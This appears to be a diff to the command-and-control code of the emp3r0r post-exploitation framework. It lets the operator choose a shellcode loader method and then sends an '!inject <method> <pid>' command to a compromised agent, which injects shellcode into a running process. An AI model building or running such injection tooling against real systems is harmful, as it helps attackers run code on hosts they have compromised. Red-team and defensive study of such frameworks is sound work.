@@ -1,6 +1,10 @@
 package cc
 
-import "github.com/jm33-m0/emp3r0r/core/internal/agent"
+import (
+	"fmt"
+
+	"github.com/jm33-m0/emp3r0r/core/internal/agent"
+)
 
 func moduleInjector() {
 	// target
@@ -10,15 +14,18 @@ func moduleInjector() {
 		return
 	}
 
-	// upload shellcode.txt
+	// shellcode.txt
 	pid := Options["pid"].Val
 	if !agent.IsFileExist(WWWRoot + "shellcode.txt") {
 		CliPrintError("%sshellcode.txt does not exist", WWWRoot)
 		return
 	}
+	// choose a shellcode loader
+	method := Options["method"].Val
+	cmd := fmt.Sprintf("!inject %s %s", method, pid)
 
 	// tell agent to inject this shellcode
-	err = SendCmd("!inject gdb "+pid, target)
+	err = SendCmd(cmd, target)
 	if err != nil {
 		CliPrintError("Could not send command to agent: %v", err)
 		return
